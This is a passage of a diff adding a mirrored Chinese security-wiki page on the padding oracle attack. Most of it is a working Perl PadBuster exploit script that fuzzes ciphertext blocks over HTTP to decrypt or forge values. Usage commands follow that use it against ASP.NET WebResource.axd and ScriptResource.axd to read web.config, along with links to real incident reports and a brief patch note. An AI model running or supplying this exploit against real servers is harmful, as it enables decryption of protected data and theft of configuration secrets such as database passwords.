+		&amp;myPrint(&quot;\nBlock &quot;.($blockNum).&quot; Results:&quot;,0);
+		&amp;myPrint(&quot;[+] New Cipher Text (HEX): &quot;.&amp;myEncode($sampleBytes,1),0);
+		&amp;myPrint(&quot;[+] Intermediate Bytes (HEX): &quot;.&amp;myEncode($intermediaryBytes,1).&quot;\n&quot;,0);
+		
+	}
+	$forgedBytes = &amp;myEncode($forgedBytes, $encoding);
+	chomp($forgedBytes);
+} else {
+	# DECRYPT MODE
+	&amp;myPrint(&quot;INFO: Starting PadBuster Decrypt Mode&quot;,0);
+	
+	if ($resumeBlock) {
+		&amp;myPrint(&quot;INFO: Resuming previous exploit at Block $resumeBlock\n&quot;,0);
+	} else {
+		$resumeBlock = 1
+	}
+	
+	# Assume that the IV is included in our sample and that the first block is the IV	
+	for (my $blockNum = ($resumeBlock+1); $blockNum &lt;= $blockCount; $blockNum++) { 
+		# Since the IV is the first block, our block count is artificially inflated by one
+		&amp;myPrint(&quot;*** Starting Block &quot;.($blockNum-1).&quot; of &quot;.($blockCount-1).&quot; ***\n&quot;,0);
+		
+		# SampleBytes is the encrypted text you want to break, so 
+		# lets copy the current ciphertext block into sampleBytes
+		my $sampleBytes = substr($encryptedBytes, ($blockNum * $blockSize - $blockSize), $blockSize);
+
+		# IntermediaryBytes is where the the intermediary bytes produced by the algorithm are stored
+		my $intermediaryBytes = &amp;processBlock($sampleBytes);
+
+		# DecryptedBytes is where the decrypted block is stored
+		my $decryptedBytes;			        	
+
+		# Now we XOR the decrypted byte with the corresponding byte from the previous block
+		# (or IV if we are in the first block) to get the actual plain-text
+		$blockNum == 2 ? $decryptedBytes = $intermediaryBytes ^ $ivBytes : $decryptedBytes = $intermediaryBytes ^ substr($encryptedBytes, (($blockNum - 2) * $blockSize), $blockSize);
+
+		&amp;myPrint(&quot;\nBlock &quot;.($blockNum-1).&quot; Results:&quot;,0);
+		&amp;myPrint(&quot;[+] Cipher Text (HEX): &quot;.&amp;myEncode($sampleBytes,1),0);
+		&amp;myPrint(&quot;[+] Intermediate Bytes (HEX): &quot;.&amp;myEncode($intermediaryBytes,1),0);
+		&amp;myPrint(&quot;[+] Plain Text: $decryptedBytes\n&quot;,0);
+		$plainTextBytes = $plainTextBytes.$decryptedBytes;
+	}
+}
+
+&amp;myPrint(&quot;-------------------------------------------------------&quot;,0);	
+&amp;myPrint(&quot;** Finished ***\n&quot;, 0);
+if ($plainTextInput) {
+	&amp;myPrint(&quot;[+] Encrypted value is: &quot;.&amp;uri_escape($forgedBytes),0);
+} else {	
+	&amp;myPrint(&quot;[+] Decrypted value (ASCII): $plainTextBytes\n&quot;,0);
+	&amp;myPrint(&quot;[+] Decrypted value (HEX): &quot;.&amp;myEncode($plainTextBytes,2).&quot;\n&quot;, 0);
+	&amp;myPrint(&quot;[+] Decrypted value (Base64): &quot;.&amp;myEncode($plainTextBytes,0).&quot;\n&quot;, 0);
+}
+&amp;myPrint(&quot;-------------------------------------------------------\n&quot;,0);	
+
+sub determineSignature { 
+	# Help the user detect the oracle response if an error string was not provided
+	# This logic will automatically suggest the response pattern that occured most often 
+	# during the test as this is the most likeley one
+
+	my @sortedGuesses = sort {$oracleGuesses{$a} &lt;=&gt; $oracleGuesses{$b}} keys %oracleGuesses; 
+
+	&amp;myPrint(&quot;The following response signatures were returned:\n&quot;,0);
+	&amp;myPrint(&quot;-------------------------------------------------------&quot;,0);
+	if ($useBody) {
+		&amp;myPrint(&quot;ID#\tFreq\tStatus\tLength\tChksum\tLocation&quot;,0);
+	} else 	{
+		&amp;myPrint(&quot;ID#\tFreq\tStatus\tLength\tLocation&quot;,0);
+	}
+	&amp;myPrint(&quot;-------------------------------------------------------&quot;,0);
+
+	my $id = 1;
+
+	foreach (@sortedGuesses) {
+		my $line = $id;
+		($id == $#sortedGuesses+1 &amp;&amp; $#sortedGuesses != 0) ? $line.= &quot; **&quot; : $line.=&quot;&quot;;
+		my @sigFields = split(&quot;\t&quot;, $_);
+		$line .= &quot;\t$oracleGuesses{$_}\t$sigFields[0]\t$sigFields[1]&quot;;
+		$useBody ? ( $line .= &quot;\t&quot;.unpack( '%32A*', $sigFields[3] ) ) : $line.=&quot;&quot;;
+		$line .= &quot;\t$sigFields[2]&quot;;
+		&amp;myPrint($line,0);
+		&amp;writeFile(&quot;Response_Analysis_Signature_&quot;.$id.&quot;.txt&quot;, $responseFileBuffer{$_});
+		$id++;
+	}
+	&amp;myPrint(&quot;-------------------------------------------------------&quot;,0);	
+
+	if ($#sortedGuesses == 0 &amp;&amp; !$bruteForce) {
+		&amp;myPrint(&quot;\nERROR: All of the responses were identical.\n&quot;,0);
+		&amp;myPrint(&quot;Double check the Block Size and try again.&quot;,0);
+		exit();
+	} else {
+		my $responseNum = &amp;promptUser(&quot;\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended&quot;);
+		&amp;myPrint(&quot;\nContinuing test with selection $responseNum\n&quot;,0);
+		$oracleSignature = $sortedGuesses[$responseNum-1];
+	}
+}
+
+sub prepRequest {
+	my ($pUrl, $pPost, $pCookie, $pSample, $pTestBytes) = @_;
+
+	# Prepare the request			
+	my $testUrl = $pUrl;
+	my $wasSampleFound = 0;
+	
+	if ($pUrl =~ /$pSample/) {
+		$testUrl =~ s/$pSample/$pTestBytes/;
+		$wasSampleFound = 1;
+	} 
+
+	my $testPost = &quot;&quot;;						
+	if ($pPost) {
+		$testPost = $pPost;
+		if ($pPost =~ /$pSample/) {
+			$testPost =~ s/$pSample/$pTestBytes/;
+			$wasSampleFound = 1;
+		}
+	}
+
+	my $testCookies = &quot;&quot;;
+	if ($pCookie) {
+		$testCookies = $pCookie;
+		if ($pCookie =~ /$pSample/) {
+			$testCookies =~ s/$pSample/$pTestBytes/;
+			$wasSampleFound = 1;
+		}
+	}
+
+	if ($wasSampleFound == 0) {
+		&amp;myPrint(&quot;ERROR: Encrypted sample was not found in the test request&quot;,0);
+		exit();
+	}
+	return ($testUrl, $testPost, $testCookies);
+}
+
+sub processBlock {
+  	my ($sampleBytes) = @_; 
+  	my $analysisMode;
+  	# Analysis mode is either 0 (response analysis) or 1 (exploit)  	
+  	$analysisMode = (!$error &amp;&amp; $oracleSignature eq &quot;&quot;) ? 0 : 1;
+  	
+  	# The return value of this subroutine is the intermediate text for the block
+	my $returnValue;
+  	
+  	my $complete = 0;
+  	my $autoRetry = 0;
+  	my $hasHit = 0;
+  	
+  	while ($complete == 0) {
+  		# Reset the return value
+  		$returnValue = &quot;&quot;;
+  		
+  		my $repeat = 0;
+	
+		# TestBytes are the fake bytes that are pre-pending to the cipher test for the padding attack
+		my $testBytes = &quot;\x00&quot; x $blockSize;
+	
+		my $falsePositiveDetector = 0;
+
+		# Work on one byte at a time, starting with the last byte and moving backwards
+		OUTERLOOP:
+		for (my $byteNum = $blockSize - 1; $byteNum &gt;= 0; $byteNum--) {
+			INNERLOOP:
+			for (my $i = 255; $i &gt;= 0; $i--) {			
+				# Fuzz the test byte
+				substr($testBytes, $byteNum, 1, chr($i));
+
+				# Combine the test bytes and the sample
+				my $combinedTestBytes = $testBytes.$sampleBytes;
+
+				if ($prefix) {
+					$combinedTestBytes = &amp;myDecode($prefix,$encodingFormat).$combinedTestBytes 
+				}
+
+				$combinedTestBytes = &amp;myEncode($combinedTestBytes, $encodingFormat);				
+				chomp($combinedTestBytes);
+
+				if (! $noEncodeOption) {
+					$combinedTestBytes = &amp;uri_escape($combinedTestBytes); 
+				}
+
+				my ($testUrl, $testPost, $testCookies) = &amp;prepRequest($url, $post, $cookie, $sample, $combinedTestBytes);
+
+				# Ok, now make the request
+
+				my ($status, $content, $location, $contentLength) = &amp;makeRequest($method, $testUrl, $testPost, $testCookies);
+
+				
+				my $signatureData = &quot;$status\t$contentLength\t$location&quot;;
+				$signatureData = &quot;$status\t$contentLength\t$location\t$content&quot; if $useBody;
+				
+				# If this is the first block and there is no padding error message defined, then cycle through 
+				# all possible requests and let the user decide what the padding error behavior is.
+				if ($analysisMode == 0) {
+					&amp;myPrint(&quot;INFO: No error string was provided...starting response analysis\n&quot;,0) if ($i == 255);
+					$oracleGuesses{$signatureData}++;
+					
+					$responseFileBuffer{$signatureData} = &quot;URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content&quot;;
+					
+					if ($byteNum == $blockSize - 1 &amp;&amp; $i == 0) {
+						&amp;myPrint(&quot;*** Response Analysis Complete ***\n&quot;,0);
+						&amp;determineSignature();
+						$analysisMode = 1;
+						$repeat = 1;
+						last OUTERLOOP;
+					}
+				}
+
+				my $continue = &quot;y&quot;;
+
+				if (($error &amp;&amp; $content !~ /$error/) || ($oracleSignature ne &quot;&quot; &amp;&amp; $oracleSignature ne $signatureData)) {
+					# This is for autoretry logic (only works on the first byte)
+					if ($autoRetry == 1 &amp;&amp;  ($byteNum == ($blockSize - 1) ) &amp;&amp; $hasHit == 0 ) {
+						$hasHit++;
+					} else {
+						# If there was no padding error, then it worked
+						&amp;myPrint(&quot;[+] Success: (&quot;.abs($i-256).&quot;/256) [Byte &quot;.($byteNum+1).&quot;]&quot;,0);
+						&amp;myPrint(&quot;[+] Test Byte:&quot;.&amp;uri_escape(substr($testBytes, $byteNum, 1)),1);
+						
+						# If continually getting a hit on attempt zero, then something is probably wrong
+						$falsePositiveDetector++ if ($i == 255);
+
+						if ($interactive == 1) {
+							$continue = &amp;promptUser(&quot;Do you want to use this value (Yes/No/All)? [y/n/a]&quot;,&quot;&quot;,1);
+						}
+
+						if ($continue eq &quot;y&quot; || $continue eq &quot;a&quot;) {
+							$interactive = 0 if ($continue eq &quot;a&quot;);
+
+							# Next, calculate the decrypted byte by XORing it with the padding value
+							my ($currentPaddingByte, $nextPaddingByte);
+
+							# These variables could allow for flexible padding schemes (for now PCKS)
+							# For PCKS#7, the padding block is equal to chr($blockSize - $byteNum)
+							$currentPaddingByte = chr($blockSize - $byteNum);
+							$nextPaddingByte = chr($blockSize - $byteNum + 1);
+
+							my $decryptedByte = substr($testBytes, $byteNum, 1) ^ $currentPaddingByte;
+							&amp;myPrint(&quot;[+] XORing with Padding Char, which is &quot;.&amp;uri_escape($currentPaddingByte),1);
+
+							$returnValue = $decryptedByte.$returnValue;
+							&amp;myPrint(&quot;[+] Decrypted Byte is: &quot;.&amp;uri_escape($decryptedByte),1);
+
+							# Finally, update the test bytes in preparation for the next round, based on the padding used 
+							for (my $k = $byteNum; $k &lt; $blockSize; $k++) {
+								# First, XOR the current test byte with the padding value for this round to recover the decrypted byte
+								substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $currentPaddingByte));				
+
+								# Then, XOR it again with the padding byte for the next round
+								substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $nextPaddingByte));
+							}
+							last INNERLOOP;                        
+						}
+
+					}
+				}
+				
+				## TODO: Combine these two blocks?
+				if ($i == 0 &amp;&amp; $analysisMode == 1) {
+					# End of the road with no success.  We should probably try again.
+					&amp;myPrint(&quot;ERROR: No matching response on [Byte &quot;.($byteNum+1).&quot;]&quot;,0);
+
+					if ($autoRetry == 0) {
+						$autoRetry = 1;
+						&amp;myPrint(&quot;       Automatically trying one more time...&quot;,0);
+						$repeat = 1;
+						last OUTERLOOP;
+						
+					} else {
+						if (($byteNum == $blockSize - 1) &amp;&amp; ($error)) {
+							&amp;myPrint(&quot;\nAre you sure you specified the correct error string?&quot;,0);
+							&amp;myPrint(&quot;Try re-running without the -e option to perform a response analysis.\n&quot;,0);
+						} 
+
+						$continue = &amp;promptUser(&quot;Do you want to start this block over? (Yes/No)? [y/n/a]&quot;,&quot;&quot;,1);
+						if ($continue ne &quot;n&quot;) {
+							&amp;myPrint(&quot;INFO: Switching to interactive mode&quot;,0);
+							$interactive = 1;
+							$repeat = 1;
+							last OUTERLOOP;
+						}					
+					}
+				}   
+				if ($falsePositiveDetector == $blockSize) {
+					&amp;myPrint(&quot;\n*** ERROR: It appears there are false positive results. ***\n&quot;,0);
+					&amp;myPrint(&quot;HINT: The most likely cause for this is an incorrect error string.\n&quot;,0);
+					if ($error) {
+						&amp;myPrint(&quot;[+] Check the error string you provided and try again, or consider running&quot;,0);
+						&amp;myPrint(&quot;[+] without an error string to perform an automated response analysis.\n&quot;,0);
+					} else {
+						&amp;myPrint(&quot;[+] You may want to consider defining a custom padding error string&quot;,0);
+						&amp;myPrint(&quot;[+] instead of the automated response analysis.\n&quot;,0);
+					}
+					$continue = &amp;promptUser(&quot;Do you want to start this block over? (Yes/No)? [y/n/a]&quot;,&quot;&quot;,1);
+					if ($continue eq &quot;y&quot;) {
+						&amp;myPrint(&quot;INFO: Switching to interactive mode&quot;,0);
+						$interactive = 1;
+						$repeat = 1;
+						last OUTERLOOP;
+					}
+				}
+			} 
+		}
+		($repeat == 1) ? ($complete = 0) : ($complete = 1);
+	}
+	return $returnValue;
+}
+
+sub makeRequest {
+ 
+ my ($method, $url, $data, $cookie) = @_; 
+ my ($noConnect, $lwp, $status, $content, $req, $location, $contentLength);   
+ my $numRetries = 0;
+ $data ='' unless $data;
+ $cookie='' unless $cookie;
+
+ $requestTracker++;
+ do {
+  #Quick hack to avoid hostname in URL when using a proxy with SSL (this will get re-set later if needed)
+  $ENV{HTTPS_PROXY} = &quot;&quot;;
+  
+  $lwp = LWP::UserAgent-&gt;new(env_proxy =&gt; 1,
+                            keep_alive =&gt; 1,
+                            timeout =&gt; 30,
+			    requests_redirectable =&gt; [],
+                            );
+ 
+  $req = new HTTP::Request $method =&gt; $url;
+
+  &amp;myPrint(&quot;Request:\n$method\n$url\n$data\n$cookie&quot;,0) if $superVerbose;
+  
+  # Add request content for POST and PUTS 
+  if ($data) {
+   $req-&gt;content_type('application/x-www-form-urlencoded');
+   $req-&gt;content($data);
+  }
+ 
+  if ($proxy) {
+  	my $proxyUrl = &quot;http://&quot;;
+  	if ($proxyAuth) {
+ 		my ($proxyUser, $proxyPass) = split(&quot;:&quot;,$proxyAuth);
+ 		$ENV{HTTPS_PROXY_USERNAME}	= $proxyUser;
+		$ENV{HTTPS_PROXY_PASSWORD}	= $proxyPass;
+		$proxyUrl .= $proxyAuth.&quot;@&quot;;
+ 	}
+ 	$proxyUrl .= $proxy;
+ 	$lwp-&gt;proxy(['http'], &quot;http://&quot;.$proxy);
+	$ENV{HTTPS_PROXY} = &quot;http://&quot;.$proxy;
+  } 	
+
+
+  if ($auth) {
+   my ($httpuser, $httppass) = split(/:/,$auth);
+   $req-&gt;authorization_basic($httpuser, $httppass);
+  }
+
+  # If cookies are defined, add a COOKIE header
+  if (! $cookie eq &quot;&quot;) {
+   $req-&gt;header(Cookie =&gt; $cookie);
+  }
+ 
+  if ($headers) {
+   my @customHeaders = split(/;/i,$headers);
+   for (my $i = 0; $i &lt;= $#customHeaders; $i++) {
+    my ($headerName, $headerVal) = split(/\::/i,$customHeaders[$i]);
+    $req-&gt;header($headerName, $headerVal);
+   }
+  }
+ 
+  my $startTime = &amp;gettimeofday();
+  my $response = $lwp-&gt;request($req);
+  my $endTime = &amp;gettimeofday();  
+  $timeTracker = $timeTracker + ($endTime - $startTime);
+  
+  if ($printStats == 1 &amp;&amp; $requestTracker % 250 == 0) {
+  	print &quot;[+] $requestTracker Requests Issued (Avg Request Time: &quot;.(sprintf &quot;%.3f&quot;, $timeTracker/100).&quot;)\n&quot;;
+  	$timeTracker = 0;
+  }
+  
+  
+  # Extract the required attributes from the response
+  $status = substr($response-&gt;status_line, 0, 3);
+  $content = $response-&gt;content;
+ 
+  &amp;myPrint(&quot;Response Content:\n$content&quot;,0) if $superVerbose;
+  $location = $response-&gt;header(&quot;Location&quot;);
+  if (!$location)   {
+   $location = &quot;N/A&quot;;
+  }
+  #$contentLength = $response-&gt;header(&quot;Content-Length&quot;);
+  $contentLength = length($content);
+  
+  
+  my $contentEncoding = $response-&gt;header(&quot;Content-Encoding&quot;);
+  if ($contentEncoding) {
+   if ($contentEncoding =~ /GZIP/i ) {
+    	$content = Compress::Zlib::memGunzip($content);
+  	$contentLength = length($content);
+   }
+  }
+  
+  my $statusMsg = $response-&gt;status_line;
+  #myPrint(&quot;Status: $statusMsg, Location: $location, Length: $contentLength&quot;,1); 
+ 
+  if ($statusMsg =~ /Can't connect/) {
+   print &quot;ERROR: $statusMsg\n   Retrying in 10 seconds...\n\n&quot;;
+   $noConnect = 1;
+   $numRetries++;
+   sleep 10;
+  } else {
+   $noConnect = 0;
+   $totalRequests++;
+  }  
+ } until (($noConnect == 0) || ($numRetries &gt;= 15));
+ if ($numRetries &gt;= 15) {
+  &amp;myPrint(&quot;ERROR: Number of retries has exceeded 15 attempts...quitting.\n&quot;,0);
+  exit;
+ }
+ return ($status, $content, $location, $contentLength);
+}
+ 
+sub myPrint {
+ my ($printData, $printLevel) = @_;
+ $printData .= &quot;\n&quot;;
+ if (($verbose &amp;&amp; $printLevel &gt; 0) || $printLevel &lt; 1 || $superVerbose) {
+  print $printData;
+  &amp;writeFile(&quot;ActivityLog.txt&quot;,$printData);
+ }
+}
+
+sub myEncode {
+ my ($toEncode, $format) = @_;
+ return &amp;encodeDecode($toEncode, 0, $format);
+}
+
+sub myDecode {
+ my ($toDecode, $format) = @_;
+ return &amp;encodeDecode($toDecode, 1, $format);
+}
+
+sub encodeDecode {
+ my ($toEncodeDecode, $oper, $format) = @_;
+ # Oper: 0=Encode, 1=Decode
+ # Format: 0=Base64, 1 Hex Lower, 2 Hex Upper, 3=NetUrlToken
+ my $returnVal = &quot;&quot;;
+ if ($format == 1 || $format == 2) {
+   # HEX
+   if ($oper == 1) {
+   	#Decode
+   	#Always convert to lower when decoding)
+   	$toEncodeDecode = lc($toEncodeDecode);
+	$returnVal = pack(&quot;H*&quot;,$toEncodeDecode);
+   } else {
+   	#Encode
+	$returnVal = unpack(&quot;H*&quot;,$toEncodeDecode);
+	if ($format == 2) {
+	   	#Uppercase
+		$returnVal = uc($returnVal)
+   	}
+   }
+ } elsif ($format == 3) {
+   # NetUrlToken
+   if ($oper == 1) {
+	$returnVal = &amp;web64Decode($toEncodeDecode,1);
+   } else {
+	$returnVal = &amp;web64Encode($toEncodeDecode,1);
+   } 
+ } elsif ($format == 4) {
+    # Web64
+    if ($oper == 1) {
+ 	$returnVal = &amp;web64Decode($toEncodeDecode,0);
+    } else {
+ 	$returnVal = &amp;web64Encode($toEncodeDecode,0);
+    } 
+ } else {
+    # B64
+    if ($oper == 1) {
+ 	$returnVal = &amp;decode_base64($toEncodeDecode);
+    } else {
+ 	$returnVal = &amp;encode_base64($toEncodeDecode);
+ 	$returnVal =~ s/(\r|\n)//g;	
+    }
+ }
+ 
+ return $returnVal;
+}
+
+
+sub web64Encode {
+ my ($input, $net) = @_;
+ # net: 0=No Padding Number, 1=Padding (NetUrlToken)
+ $input = &amp;encode_base64($input);
+ $input =~ s/(\r|\n)//g;
+ $input =~ s/\+/\-/g;
+ $input =~ s/\//\_/g;
+ my $count = $input =~ s/\=//g;
+ $count = 0 if ($count eq &quot;&quot;);
+ $input.=$count if ($net == 1);
+ return $input;
+}
+
+sub web64Decode {
+ my ($input, $net) = @_;
+ # net: 0=No Padding Number, 1=Padding (NetUrlToken)
+ $input =~ s/\-/\+/g;
+ $input =~ s/\_/\//g;
+ if ($net == 1) {
+  my $count = chop($input);
+  $input = $input.(&quot;=&quot; x int($count));
+ }
+ return &amp;decode_base64($input);
+}
+
+
+sub promptUser {
+ my($prompt, $default, $yn) = @_;
+ my $defaultValue = $default ? &quot;[$default]&quot; : &quot;&quot;;
+ print &quot;$prompt $defaultValue: &quot;;
+ chomp(my $input = &lt;STDIN&gt;);
+ 
+ $input = $input ? $input : $default;
+ if ($yn) {
+  if ($input =~ /^y|n|a$/) {
+   return $input;
+  } else {
+   &amp;promptUser($prompt, $default, $yn);
+  }
+ } else {
+  if ($input =~ /^-?\d/ &amp;&amp; $input &gt; 0 &amp;&amp; $input &lt; 256) {
+   return $input;
+  } else {
+   &amp;promptUser($prompt, $default);
+  }
+ }
+}
+
+sub writeFile {
+ my ($fileName, $fileContent) = @_;
+ if ($logFiles) {
+  if ($dirExists != 1) {
+   system($dirCmd.&quot; &quot;.$dirName);
+   $dirExists = 1;
+  }
+  $fileName = $dirName.$dirSlash.$fileName;
+  open(my $OUTFILE, '&gt;&gt;', $fileName) or die &quot;ERROR: Can't write to file $fileName\n&quot;;
+  print $OUTFILE $fileContent;
+  close($OUTFILE);
+ }
+}
+
+sub getTime { 
+ my ($format) = @_;
+ my ($second, $minute, $hour, $day, $month, $year, $weekday, $dayofyear, $isDST) = localtime(time);
+ my @months = (&quot;JAN&quot;,&quot;FEB&quot;,&quot;MAR&quot;,&quot;APR&quot;,&quot;MAY&quot;,&quot;JUN&quot;,&quot;JUL&quot;,&quot;AUG&quot;,&quot;SEP&quot;,&quot;OCT&quot;,&quot;NOV&quot;,&quot;DEC&quot;);
+ my @days = (&quot;SUN&quot;,&quot;MON&quot;,&quot;TUE&quot;,&quot;WED&quot;,&quot;THU&quot;,&quot;FRI&quot;,&quot;SAT&quot;);
+ $month=sprintf(&quot;%02d&quot;,$month);
+ $day=sprintf(&quot;%02d&quot;,$day);
+ $hour=sprintf(&quot;%02d&quot;,$hour);
+ $minute=sprintf(&quot;%02d&quot;,$minute);
+ $second=sprintf(&quot;%02d&quot;, $second);
+ $year =~ s/^.//;
+ if ($format eq &quot;F&quot;) {
+  return $day.$months[$month].$year.&quot;-&quot;.( ($hour * 3600) + ($minute * 60) + ($second) );
+ } elsif ($format eq &quot;S&quot;) {
+  return $months[$month].&quot; &quot;.$day.&quot;, 20&quot;.$year.&quot; at &quot;.$hour.&quot;:&quot;.$minute.&quot;:&quot;.$second;
+ } else {
+  return $hour.&quot;:&quot;.$minute.&quot;:&quot;.$second;
+ }
+}
+&lt;/code&gt;
+
+
+使用方法
+&lt;code bash&gt;Padbuster.pl http://www.xxx.com/WebResource.axd?d=XXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXX 16 -encoding 3 -plaintext &quot;|||~/web.config&quot;&lt;/code&gt;
+XXXXXXXXXXXXXXXX是http://www.xxx.com/WebResource.axd?d=XXXXXXXXXXXXXXXX中参数d的值。
+16为每个数据块的字节数，分为8和16。encoding参数有4种，分别是0=Base64, 1=Lower HEX, 2=Upper HEX 3=.NET UrlToken, 4=WebSafe Base64。plaintext为想读取内容的文件，本次这里以web.config为例。之后按程序提示进行操作。若网站存在padding oracle漏洞，最终将返回web.config的URL的加密地址。
+
+&lt;code bash&gt;Webconfig Bruter.pl http://www.xxx.com/ScriptResource.axd XXXXXXXXXXXXXXXXXX 16&lt;/code&gt;
+XXXXXXXXXXXXXXXXXX为Padbuster.pl得到的加密地址。
+
+访问
+&lt;code&gt;http://www.xxx91ri.org/ScriptResource.axd?d=XXXXXXXXXXXXXXXXXX&lt;/code&gt;
+XXXXXXXXXXXXXXXXXX为Webconfig Bruter.pl得到的加密地址。服务器会返回目标文件的内容（此处为web.config文件）。
+==== 4、实际案例 ====
+
+----
+[[http://www.wooyun.org/bugs/wooyun-2010-052726|迅雷某分站padding oracle漏洞]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-035874|锐捷某系统padding oraacle漏洞泄露内部数据库密码与web配置信息]]
+
+[[http://www.wooyun.org/bugs/wooyun-2010-033805|唯品会某处存在文件读取漏洞（padding oracle实际利用）]]
+==== 5、漏洞修复 ====
+
+----
+安装微软官方补丁。
+==== 6、相关资源 ====
+
+----
+[[https://technet.microsoft.com/library/security/ms10-070|Microsoft 安全公告 MS10-070 - 重要]]</textarea>
+<div id="wiki__editbar" class="editBar">
+<div id="size__ctl">
+</div>
+</div>
+</div></form>
+</div>
+
+              <!-- wikipage stop -->
+
+                            
+            </div>
+          </div>
+
+        </article>
+
+        
+      </main>
+
+      <footer id="dokuwiki__footer" class="small hidden-print">
+
+        <a href="javascript:void(0)" class="back-to-top hidden-print btn btn-default btn-sm" title="跳至内容>" id="back-to-top"><i class="glyphicon glyphicon-chevron-up"></i></a>
+
+                <div class="text-center">
+          <p id="dw__license">
+                      </p>
+                  </div>
+      </footer>
+
+      
+    </div><!-- /site -->
+
+    <div class="no"><img src="http://wiki.wooyun.org/lib/exe/indexer.php?id=server%3Apadding-oracle-attack&amp;1449197596" width="2" height="1" alt="" /></div>
+    <div id="screen__mode" class="no">
+      <span class="visible-xs"></span>
+      <span class="visible-sm"></span>
+      <span class="visible-md"></span>
+      <span class="visible-lg"></span>
+    </div>
+  </div>
+  <!--[if ( lte IE 7 | IE 8 ) ]></div><![endif]-->
+</body>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "http://hm.baidu.com/hm.js?2e9369dace9479584f08203285c7cbce";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<!-- Mirrored from wiki.wooyun.org/server:padding-oracle-attack?do=edit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:04 GMT -->
+</html>
